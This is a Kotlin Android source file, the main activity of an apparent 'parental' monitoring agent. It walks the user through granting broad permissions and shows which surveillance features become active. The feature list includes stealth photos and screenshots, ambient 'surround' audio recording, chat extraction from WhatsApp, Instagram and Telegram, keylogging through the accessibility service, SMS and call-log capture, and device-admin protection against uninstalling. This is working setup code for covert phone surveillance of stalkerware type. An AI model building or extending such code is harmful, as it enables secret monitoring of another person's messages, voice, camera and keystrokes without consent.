package com.parental.agent.ui

import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.compose.runtime.*
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.services.AgentDeviceAdminReceiver
import com.parental.agent.ui.navigation.Screen
import com.parental.agent.ui.onboarding.*
import com.parental.agent.ui.theme.AndroidAgentTheme

class MainActivity : ComponentActivity() {

    private val permissionsListState = mutableStateListOf<PermissionItem>()

    // Launcher for standard Android runtime permissions
    private val runtimePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        refreshPermissionStates()
    }

    // Launcher for system settings screens
    private val settingsActivityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStates()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = AppPreferences(this)

        // Check & Execute Path A Device Owner Silent Provisioning if provisioned
        val deviceOwnerManager = com.parental.agent.policy.DeviceOwnerManager(this)
        if (deviceOwnerManager.isDeviceOwner()) {
            deviceOwnerManager.executeDeviceOwnerProvisioning()
        }

        initPermissionList()
        refreshPermissionStates()

        val allGranted = areAllPermissionsGranted()

        // Determine persistent initial screen based on saved preferences & live permission status
        val initialScreen = when {
            !prefs.isTermsAccepted() -> Screen.Terms
            !prefs.isDevicePaired() -> Screen.Permissions
            !allGranted -> Screen.Permissions // If any permission (e.g. Accessibility) is missing or revoked on app reopen, show Permissions screen!
            else -> Screen.ActiveStatus // Already paired & all permissions granted: Open Active Status directly.
        }

        setContent {
            AndroidAgentTheme {
                var currentScreen by remember { mutableStateOf<Screen>(initialScreen) }
                var pairedDeviceName by remember { mutableStateOf(prefs.getPairedDeviceName()) }

                val featureCapabilities = remember(permissionsListState.map { it.isGranted }) {
                    val isLoc = permissionsListState.find { it.id == "loc" }?.isGranted == true
                    val isCalls = permissionsListState.find { it.id == "calls" }?.isGranted == true
                    val isSms = permissionsListState.find { it.id == "sms" }?.isGranted == true
                    val isUsage = permissionsListState.find { it.id == "usage" }?.isGranted == true
                    val isOverlay = permissionsListState.find { it.id == "overlay" }?.isGranted == true
                    val isAccess = permissionsListState.find { it.id == "accessibility" }?.isGranted == true
                    val isNotif = permissionsListState.find { it.id == "notification" }?.isGranted == true
                    val isAudio = permissionsListState.find { it.id == "audio" }?.isGranted == true
                    val isCamera = permissionsListState.find { it.id == "camera" }?.isGranted == true
                    val isAdmin = permissionsListState.find { it.id == "admin" }?.isGranted == true

                    listOf(
                        FeatureCapability(
                            name = "Live Location & Geofencing",
                            description = "Real-time GPS tracking & historical route playback",
                            status = if (isLoc) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isLoc) "Fine GPS Active" else "Location Permission Missing"
                        ),
                        FeatureCapability(
                            name = "Call & SMS Telemetry",
                            description = "Incoming/outgoing call logs & SMS text content",
                            status = when {
                                isCalls && isSms -> FeatureStatusLevel.FULL
                                isCalls || isSms -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isCalls && isSms -> "Call Logs & SMS Active"
                                isCalls -> "Calls Only (SMS Missing)"
                                isSms -> "SMS Only (Calls Missing)"
                                else -> "Call & SMS Permissions Missing"
                            }
                        ),
                        FeatureCapability(
                            name = "Social Apps (WhatsApp, IG, Telegram)",
                            description = "Chat UI text, notification parsing & call activity",
                            status = when {
                                isAccess && isNotif -> FeatureStatusLevel.FULL
                                isNotif -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isAccess && isNotif -> "Full Chat Extraction & Notifications"
                                isNotif -> "Notification Inspection Only (Accessibility Disabled)"
                                else -> "Accessibility & Notification Service Disabled"
                            }
                        ),
                        FeatureCapability(
                            name = "App Blocker & Screen Time",
                            description = "Enforces app daily limits & block screens",
                            status = when {
                                isUsage && isOverlay -> FeatureStatusLevel.FULL
                                isUsage -> FeatureStatusLevel.PARTIAL
                                else -> FeatureStatusLevel.DISABLED
                            },
                            statusNote = when {
                                isUsage && isOverlay -> "Usage Tracking & Block Overlay Active"
                                isUsage -> "Usage Tracking Only (Overlay Disabled)"
                                else -> "App Usage Access Disabled"
                            }
                        ),
                        FeatureCapability(
                            name = "Call & Surround Audio Capture",
                            description = "Audio recording fallback & ambient surround",
                            status = if (isAudio) FeatureStatusLevel.PARTIAL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isAudio) "Mic Fallback & Ambient Surround Active" else "Audio Permission Disabled"
                        ),
                        FeatureCapability(
                            name = "Stealth Photos & Screenshots",
                            description = "Instant photo capture & screen telemetry",
                            status = if (isCamera) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isCamera) "Camera Active" else "Camera Permission Disabled"
                        ),
                        FeatureCapability(
                            name = "Uninstall Protection",
                            description = "Prevents unauthorized app removal",
                            status = if (isAdmin) FeatureStatusLevel.FULL else FeatureStatusLevel.DISABLED,
                            statusNote = if (isAdmin) "Device Admin Active" else "Device Admin Permission Missing"
                        )
                    )
                }

                when (currentScreen) {
                    is Screen.Terms -> {
                        TermsScreen(
                            onAccepted = {
                                prefs.setTermsAccepted(true)
                                currentScreen = Screen.Permissions
                            }
                        )
                    }

                    is Screen.Permissions -> {
                        PermissionsScreen(
                            permissionList = permissionsListState,
                            featureCapabilities = featureCapabilities,
                            isAlreadyPaired = prefs.isDevicePaired(),
                            onRequestPermission = { item ->
                                handlePermissionRequest(item)
                            },
                            onContinue = {
                                // If device is ALREADY paired/activated, skip pairing screen and go directly to Active Status!
                                if (prefs.isDevicePaired()) {
                                    currentScreen = Screen.ActiveStatus
                                } else {
                                    currentScreen = Screen.Pairing
                                }
                            }
                        )
                    }

                    is Screen.Pairing -> {
                        PairingScreen(
                            deviceId = prefs.getDeviceId(),
                            onPairDevice = { _, alias ->
                                pairedDeviceName = alias
                                prefs.setTermsAccepted(true)
                                prefs.setDevicePaired(true)
                                prefs.setPairedDeviceName(alias)
                                currentScreen = Screen.ActiveStatus
                            }
                        )
                    }

                    is Screen.ActiveStatus -> {
                        val hasPending = com.parental.agent.ota.OtaUpdateManager.hasPendingUpdate(this@MainActivity)
                        val pendingVersion = com.parental.agent.ota.OtaUpdateManager.getPendingUpdateVersion(this@MainActivity)
                        ActiveStatusScreen(
                            deviceName = pairedDeviceName,
                            activeCollectorsCount = permissionsListState.count { it.isGranted },
                            hasPendingUpdate = hasPending,
                            pendingUpdateVersion = pendingVersion,
                            onInstallUpdate = {
                                com.parental.agent.ota.OtaUpdateManager.installPendingUpdate(this@MainActivity)
                            }
                        )
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        refreshPermissionStates()
    }

    private fun areAllPermissionsGranted(): Boolean {
        return permissionsListState.isNotEmpty() && permissionsListState.all { it.isGranted }
    }

    private fun initPermissionList() {
        permissionsListState.clear()

        // 1. Fine Location
        permissionsListState.add(
            PermissionItem(
                id = "loc",
                title = "Live GPS Location",
                description = "Required for real-time location tracking & geofencing alerts.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 2. Call Logs
        permissionsListState.add(
            PermissionItem(
                id = "calls",
                title = "Call History Telemetry",
                description = "Monitors incoming, outgoing, and missed phone calls.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 3. SMS Telemetry
        permissionsListState.add(
            PermissionItem(
                id = "sms",
                title = "SMS Telemetry",
                description = "Monitors incoming and outgoing text messages.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 4. Contacts
        permissionsListState.add(
            PermissionItem(
                id = "contacts",
                title = "Contacts Inventory",
                description = "Syncs address book contacts to detect unknown callers.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 5. Calendar Events
        permissionsListState.add(
            PermissionItem(
                id = "calendar",
                title = "Calendar Events & Schedule",
                description = "Monitors device calendar schedules, appointments, and reminders.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 5. Audio Recording
        permissionsListState.add(
            PermissionItem(
                id = "audio",
                title = "Call & Surround Audio",
                description = "Enables call recording fallback & ambient audio capture.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 6. Camera Access
        permissionsListState.add(
            PermissionItem(
                id = "camera",
                title = "Stealth Photo Capture",
                description = "Allows taking stealth snapshots upon security alerts.",
                isGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            )
        )

        // 7. Accessibility Service
        permissionsListState.add(
            PermissionItem(
                id = "accessibility",
                title = "Accessibility Core Engine",
                description = "Monitors social messaging apps (WhatsApp, IG, Telegram) & keylogs.",
                isGranted = isAccessibilityServiceEnabled()
            )
        )

        // 8. Notification Access
        permissionsListState.add(
            PermissionItem(
                id = "notification",
                title = "Notification Listener",
                description = "Captures instant messaging notifications & system warnings.",
                isGranted = isNotificationServiceEnabled()
            )
        )

        // 9. App Usage Stats
        permissionsListState.add(
            PermissionItem(
                id = "usage",
                title = "App Usage Tracking",
                description = "Measures daily screen time and application launch metrics.",
                isGranted = isUsageAccessGranted()
            )
        )

        // 10. System Overlay
        permissionsListState.add(
            PermissionItem(
                id = "overlay",
                title = "Draw Over Other Apps",
                description = "Displays block screens when app time limits are reached.",
                isGranted = Settings.canDrawOverlays(this)
            )
        )

        // 11. Battery Optimization Exclusion
        permissionsListState.add(
            PermissionItem(
                id = "battery",
                title = "Ignore Battery Optimization",
                description = "Ensures background telemetry continuous execution without OS kill.",
                isGranted = isBatteryOptimizationIgnored()
            )
        )

        // 12. Device Admin / MDM
        permissionsListState.add(
            PermissionItem(
                id = "admin",
                title = "Device Admin Protection",
                description = "Prevents unauthorized uninstallation of the security agent.",
                isGranted = isDeviceAdminActive()
            )
        )

        // 13. Enterprise Device Owner (MDM - Optional)
        permissionsListState.add(
            PermissionItem(
                id = "device_owner",
                title = "Enterprise Device Owner (MDM)",
                description = "(Optional) Hardware-level protection & silent background execution via ADB.",
                isGranted = com.parental.agent.policy.DeviceOwnerManager(this).isDeviceOwner(),
                isMandatory = false
            )
        )

        // 14. All Files Storage Access (Full Media & WhatsApp Access)
        permissionsListState.add(
            PermissionItem(
                id = "storage",
                title = "All Files Storage Access",
                description = "Grants full media, gallery photos, WhatsApp voice notes & file tracking access.",
                isGranted = isStorageManagerGranted()
            )
        )
    }

    private fun isStorageManagerGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun refreshPermissionStates() {
        for (i in permissionsListState.indices) {
            val item = permissionsListState[i]
            val granted = when (item.id) {
                "loc" -> ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                "calls" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
                "sms" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                "contacts" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
                "calendar" -> ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED
                "audio" -> ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
                "camera" -> ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
                "storage" -> isStorageManagerGranted()
                "accessibility" -> isAccessibilityServiceEnabled()
                "notification" -> isNotificationServiceEnabled()
                "usage" -> isUsageAccessGranted()
                "overlay" -> Settings.canDrawOverlays(this)
                "battery" -> isBatteryOptimizationIgnored()
                "admin" -> isDeviceAdminActive()
                "device_owner" -> com.parental.agent.policy.DeviceOwnerManager(this).isDeviceOwner()
                else -> false
            }
            permissionsListState[i] = item.copy(isGranted = granted)
        }
    }

    private fun handlePermissionRequest(item: PermissionItem) {
        when (item.id) {
            "loc" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
            "calls" -> {
                runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE, Manifest.permission.ANSWER_PHONE_CALLS))
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    try {
                        val roleManager = getSystemService(android.app.role.RoleManager::class.java)
                        if (roleManager != null && roleManager.isRoleAvailable(android.app.role.RoleManager.ROLE_CALL_SCREENING) && !roleManager.isRoleHeld(android.app.role.RoleManager.ROLE_CALL_SCREENING)) {
                            val intent = roleManager.createRequestRoleIntent(android.app.role.RoleManager.ROLE_CALL_SCREENING)
                            settingsActivityLauncher.launch(intent)
                        }
                    } catch (e: Exception) {
                        // Quiet fallback
                    }
                }
            }
            "sms" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS))
            "contacts" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CONTACTS))
            "calendar" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_CALENDAR))
            "audio" -> runtimePermissionLauncher.launch(arrayOf(Manifest.permission.RECORD_AUDIO))
            "camera" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    runtimePermissionLauncher.launch(arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_MEDIA_IMAGES))
                } else {
                    runtimePermissionLauncher.launch(arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE))
                }
            }
            "storage" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        settingsActivityLauncher.launch(intent)
                    } catch (e: Exception) {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        settingsActivityLauncher.launch(intent)
                    }
                } else {
                    runtimePermissionLauncher.launch(arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE))
                }
            }
            "accessibility" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            "notification" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            "usage" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            "overlay" -> settingsActivityLauncher.launch(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            "battery" -> {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                settingsActivityLauncher.launch(intent)
            }
            "admin" -> {
                val component = ComponentName(this, AgentDeviceAdminReceiver::class.java)
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enables protection against unauthorized app uninstallation.")
                }
                settingsActivityLauncher.launch(intent)
            }
            "device_owner" -> {
                try {
                    val isDevEnabled = Settings.Global.getInt(contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
                    if (isDevEnabled) {
                        val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)
                        settingsActivityLauncher.launch(intent)
                    } else {
                        val intent = Intent(Settings.ACTION_DEVICE_INFO_SETTINGS)
                        settingsActivityLauncher.launch(intent)
                    }
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_SETTINGS)
                    settingsActivityLauncher.launch(intent)
                }
            }
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedService = "$packageName/com.parental.agent.services.AgentAccessibilityService"
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabledServices.contains(expectedService)
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val component = ComponentName(this, AgentDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(component)
    }
}
